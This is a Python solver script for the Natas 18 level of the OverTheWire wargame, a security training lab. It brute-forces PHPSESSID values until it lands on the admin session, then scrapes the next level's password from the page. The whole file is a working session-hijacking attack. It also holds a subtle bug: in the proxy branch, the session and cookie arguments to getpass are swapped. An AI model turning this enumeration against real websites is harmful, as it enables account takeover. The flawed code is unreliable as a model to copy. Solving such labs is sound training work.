import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, password, session, proxies=None):
    print(f"[+] Logging in as {user}...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = session.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)


def fuzz(url, user, password, session, proxies=None):
    for i in range(1, 640):        
        cookie = {"PHPSESSID": str(i)}
        response = session.get(url, auth=(user, password), cookies=cookie, proxies=proxies)
        sys.stdout.write('\r')
        sys.stdout.write(f"[+] Fuzzing the cookie: {i}/640 " )
        sys.stdout.flush()
        if 'Password' in response.text:
            sys.stdout.write('\r')
            print(f"[+] Found the admin cookie: {cookie}")
            break
    
    return cookie

# Function to extract the password from the response
def getpass(url, user, password, session, cookie, proxies=None):
    print(f"[+] Getting the password...")
    time.sleep(1)
            
    response = session.get(url, auth=(user, password), cookies=cookie, proxies=proxies)
    content = response.text

    # Define regex pattern to find the password
    pattern = r'([A-Za-z0-9]{32})'
    # Using regex to search for password and extract it.
    passwd = (re.findall(pattern, content))
    print(f"[+] The password of natas19 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas19 by fuzzing for the admin cookie.")
    parser.add_argument('-p', '--password', help='Password of natas18.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas18'
    url = f'http://{user}.natas.labs.overthewire.org'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    session = requests.Session()

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, password, session,  proxies=proxies)
        cookie = fuzz(url, user, password, session, proxies=proxies)
        getpass(url, user, password, cookie, session, proxies=proxies)

    else:
        login(url, user, password, session)
        cookie = fuzz(url, user, password, session)
        getpass(url, user, password, session, cookie)
    
if __name__ == "__main__":
    main()